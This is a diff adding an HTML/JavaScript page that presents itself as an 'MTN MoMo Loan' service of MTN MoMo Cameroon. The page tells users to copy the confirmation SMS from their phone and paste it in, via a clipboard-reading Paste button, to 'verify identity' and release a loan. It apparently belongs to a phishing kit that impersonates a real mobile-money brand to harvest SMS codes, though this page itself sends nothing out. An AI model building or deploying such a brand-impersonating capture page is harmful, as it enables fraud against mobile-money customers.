@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan - Verify SMS</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+        }
+
+        .back-btn {
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            transition: transform 0.2s;
+        }
+
+        .back-btn:hover {
+            transform: scale(1.1);
+        }
+
+        .logo-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 700;
+            font-size: 18px;
+            padding: 8px 18px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+        }
+
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+        }
+
+        /* ===== ICON ===== */
+        .icon-badge {
+            width: 68px;
+            height: 68px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #f0f4ff, #e0e8ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 32px;
+            box-shadow: 0 6px 18px rgba(0, 71, 171, 0.12);
+            animation: gentlePulse 2.4s ease-in-out infinite;
+        }
+
+        @keyframes gentlePulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .page-title {
+            font-size: 22px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+
+        .page-title .highlight {
+            color: #0047AB;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            padding: 0 6px;
+        }
+
+        .instruction strong {
+            color: #1a1a2e;
+            font-weight: 700;
+        }
+
+        /* ===== STEP HINT ===== */
+        .step-hint {
+            background: #f8f9ff;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .step-hint .hint-icon {
+            font-size: 18px;
+            flex-shrink: 0;
+            line-height: 1.3;
+        }
+
+        .step-hint p {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .step-hint p strong {
+            color: #0047AB;
+        }
+
+        /* ===== SMS TEXTAREA (message bubble style) ===== */
+        .sms-wrapper {
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        .sms-textarea {
+            width: 100%;
+            min-height: 150px;
+            padding: 16px 16px 50px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 16px 16px 16px 4px;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            color: #1a1a2e;
+            line-height: 1.55;
+            resize: vertical;
+            outline: none;
+            background: #fafbff;
+            transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+        }
+
+        .sms-textarea:focus {
+            border-color: #0047AB;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+        }
+
+        .sms-textarea::placeholder {
+            color: #b0b0b0;
+        }
+
+        .sms-textarea.invalid {
+            border-color: #e74c3c;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.12);
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%,
+            100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        /* Paste button inside textarea bottom-right */
+        .paste-btn {
+            position: absolute;
+            right: 10px;
+            bottom: 10px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #0047AB;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 8px 14px;
+            font-size: 13px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s;
+            box-shadow: 0 4px 12px rgba(0, 71, 171, 0.25);
+        }
+
+        .paste-btn:hover {
+            background: #002D7A;
+            transform: scale(1.03);
+        }
+
+        .paste-btn:active {
+            transform: scale(0.97);
+        }
+
+        .paste-btn .paste-icon {
+            font-size: 14px;
+        }
+
+        /* Character count */
+        .char-count {
+            text-align: right;
+            font-size: 11px;
+            color: #aaa;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+
+        .char-count.valid {
+            color: #27ae60;
+        }
+
+        /* ===== ERROR TEXT ===== */
+        .error-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+        .error-text.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            0% { opacity: 0; transform: translateY(-5px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== RESEND ROW ===== */
+        .resend-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 14px;
+            padding: 0 2px;
+        }
+
+        .resend-row span {
+            font-size: 13px;
+            color: #777;
+        }
+
+        .resend-link {
+            font-size: 13px;
+            font-weight: 700;
+            color: #0047AB;
+            text-decoration: none;
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-family: 'Inter', sans-serif;
+            padding: 4px 8px;
+            border-radius: 8px;
+            transition: background 0.2s;
+        }
+
+        .resend-link:hover:not(:disabled) {
+            background: #f0f4ff;
+        }
+
+        .resend-link:disabled {
+            color: #bbb;
+            cursor: not-allowed;
+        }
+
+        /* ===== VERIFY BUTTON ===== */
+        .verify-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+            font-family: 'Inter', sans-serif;
+            margin-top: 20px;
+        }
+
+        .verify-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
+        }
+
+        .verify-btn:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+
+        .verify-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Loading spinner inside button */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2.5px solid rgba(255, 255, 255, 0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: -3px;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== SECURITY NOTICE ===== */
+        .security-notice {
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+            line-height: 1.5;
+            text-align: center;
+            padding: 0 8px;
+        }
+
+        .security-notice .lock-icon {
+            font-size: 14px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        footer {
+            padding: 15px;
+            color: #aaa;
+            font-size: 12px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 18px;
+            }
+            .page-title {
+                font-size: 19px;
+            }
+            .instruction {
+                font-size: 13px;
+            }
+            .sms-textarea {
+                font-size: 13px;
+                padding: 14px 14px 48px 14px;
+                min-height: 130px;
+            }
+            .paste-btn {
+                padding: 7px 12px;
+                font-size: 12px;
+            }
+            .icon-badge {
+                width: 60px;
+                height: 60px;
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='login.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <span class="momo-icon">MoMo</span>
+        </div>
+        <div style="width:28px;"></div>
+    </header>
+
+    <main class="card">
+        <!-- Icon -->
+        <div class="icon-badge">📩</div>
+
+        <!-- Title -->
+        <h1 class="page-title">
+            Paste the <span class="highlight">SMS</span> from MTN
+        </h1>
+
+        <!-- Instructions -->
+        <p class="instruction">
+            We sent a confirmation message to your MoMo number.
+            <strong>Copy the full SMS you received</strong> and paste it below to verify your identity and complete your loan disbursement.
+        </p>
+
+        <!-- Step hint -->
+        <div class="step-hint">
+            <span class="hint-icon">💡</span>
+            <p>Open your <strong>Messages app</strong>, find the SMS from <strong>MTN MoMo</strong>, long-press it, tap <strong>Copy</strong>, then come back here.</p>
+        </div>
+
+        <!-- SMS paste area -->
+        <div class="sms-wrapper">
+            <textarea
+                class="sms-textarea"
+                id="smsInput"
+                placeholder="Paste the SMS you received from MTN here…"
+                spellcheck="false"
+                autocomplete="off"></textarea>
+            <button class="paste-btn" id="pasteBtn" type="button">
+                <span class="paste-icon">📋</span>
+                <span>Paste</span>
+            </button>
+        </div>
+
+        <!-- Character count -->
+        <div class="char-count" id="charCount">0 characters</div>
+
+        <!-- Error message -->
+        <div class="error-text" id="smsError">
+            The message you pasted doesn't look like an MTN MoMo SMS. Please make sure you copied the full message.
+        </div>
+
+        <!-- Resend row -->
+        <div class="resend-row">
+            <span>Didn't receive the SMS?</span>
+            <button class="resend-link" id="resendBtn" type="button" disabled>
+                Resend (<span id="countdown">60</span>s)
+            </button>
+        </div>
+
+        <!-- Verify button -->
+        <button class="verify-btn" id="verifyBtn" disabled>
+            VERIFY &amp; CONTINUE →
+        </button>
+
+        <!-- Security notice -->
+        <div class="security-notice">
+            <span class="lock-icon">🔒</span>
+            <span>We never ask for your PIN, password, or bank details. Only paste the SMS you received from MTN.</span>
+        </div>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroon</footer>
+
+    <script>
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
+        const smsInput = document.getElementById('smsInput');
+        const pasteBtn = document.getElementById('pasteBtn');
+        const charCount = document.getElementById('charCount');
+        const smsError = document.getElementById('smsError');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const resendBtn = document.getElementById('resendBtn');
+        const countdownEl = document.getElementById('countdown');
+
+        // ============================================
+        // VERIFY PHONE WAS LOGGED IN (safety check)
+        // ============================================
+        const sessionRaw = localStorage.getItem('momoSession');
+        if (!sessionRaw) {
+            // If no session, send back to login
+            window.location.href = 'login.html';
+        }
+
+        // ============================================
+        // SMS INPUT HANDLING
+        // ============================================
+        const MIN_LENGTH = 20;          // SMS must be reasonably long
+        const MTN_KEYWORDS = ['mtn', 'momo', 'transaction', 'ref', 'amount', 'xaf', 'confirmed'];
+
+        function updateCharCount() {
+            const len = smsInput.value.trim().length;
+            charCount.textContent = len + ' character' + (len === 1 ? '' : 's');
+            charCount.classList.toggle('valid', len >= MIN_LENGTH);
+        }
+
+        function isLikelyMtnSms(text) {
+            const lower = text.toLowerCase();
+            // Must contain at least one MTN-related keyword
+            return MTN_KEYWORDS.some(k => lower.includes(k));
+        }
+
+        function updateVerifyState() {
+            const text = smsInput.value.trim();
+            const longEnough = text.length >= MIN_LENGTH;
+            verifyBtn.disabled = !longEnough;
+            if (longEnough) {
+                smsError.classList.remove('show');
+                smsInput.classList.remove('invalid');
+            }
+        }
+
+        smsInput.addEventListener('input', function() {
+            updateCharCount();
+            updateVerifyState();
+        });
+
+        // Prevent non-text pastes from breaking anything
+        smsInput.addEventListener('paste', function() {
+            // Let the default paste happen, then update after a tick
+            setTimeout(() => {
+                updateCharCount();
+                updateVerifyState();
+            }, 0);
+        });
+
+        // ============================================
+        // PASTE BUTTON — uses Clipboard API when allowed
+        // ============================================
+        pasteBtn.addEventListener('click', async function() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const text = await navigator.clipboard.readText();
+                    if (text) {
+                        smsInput.value = text;
+                        updateCharCount();
+                        updateVerifyState();
+                        smsInput.focus();
+                    } else {
+                        smsInput.focus();
+                        alert('Your clipboard is empty. Please copy the SMS from MTN first.');
+                    }
+                } else {
+                    // Fallback: focus the textarea so the user can long-press to paste
+                    smsInput.focus();
+                    alert('Automatic paste is not supported on this browser. Please long-press inside the box and choose Paste.');
+                }
+            } catch (err) {
+                // Permission denied → fallback
+                smsInput.focus();
+                alert('Please long-press inside the box and choose Paste.');
+            }
+        });
+
+        // ============================================
+        // RESEND COUNTDOWN (60s)
+        // ============================================
+        let remaining = 60;
+        let timer = null;
+
+        function startCountdown() {
+            remaining = 60;
+            resendBtn.disabled = true;
+            countdownEl.textContent = remaining;
+
+            timer = setInterval(function() {
+                remaining--;
+                countdownEl.textContent = remaining;
+                if (remaining <= 0) {
+                    clearInterval(timer);
+                    resendBtn.disabled = false;
+                    resendBtn.innerHTML = 'Resend SMS';
+                }
+            }, 1000);
+        }
+
+        startCountdown();
+
+        resendBtn.addEventListener('click', function() {
+            if (resendBtn.disabled) return;
+            // In production: call your backend to resend the SMS
+            console.log('📤 Resend SMS requested for:', sessionRaw ? JSON.parse(sessionRaw).phone : 'unknown');
+            startCountdown();
+        });
+
+        // ============================================
+        // VERIFY BUTTON
+        // ============================================
+        verifyBtn.addEventListener('click', function() {
+            const text = smsInput.value.trim();
+
+            if (text.length < MIN_LENGTH) {
+                smsInput.classList.add('invalid');
+                smsError.textContent = 'The message is too short. Please copy the full SMS from MTN.';
+                smsError.classList.add('show');
+                smsInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                smsInput.focus();
+                return;
+            }
+
+            if (!isLikelyMtnSms(text)) {
+                smsInput.classList.add('invalid');
+                smsError.textContent = "The message you pasted doesn't look like an MTN MoMo SMS. Please make sure you copied the full message.";
+                smsError.classList.add('show');
+                smsInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                smsInput.focus();
+                return;
+            }
+
+            // All good → show loading, then redirect
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<span class="spinner"></span>VERIFYING...';
+
+            // Save pasted SMS locally (demo only — never do this in production)
+            localStorage.setItem('momoSmsVerify', JSON.stringify({
+                smsLength: text.length,
+                submittedAt: new Date().toISOString()
+            }));
+
+            // Simulate verification delay
+            setTimeout(function() {
+                window.location.href = 'dashboard.html';
+            }, 1500);
+        });
+
+        // ============================================
+        // INIT
+        // ============================================
+        updateCharCount();
+        updateVerifyState();
+
+        console.log('====================================');
+        console.log('💰 MTN MoMo Loan – Cameroon');
+        console.log('📩 SMS Paste / Verify Page Loaded');
+        console.log('====================================');
+    </script>
+</body>
+</html>
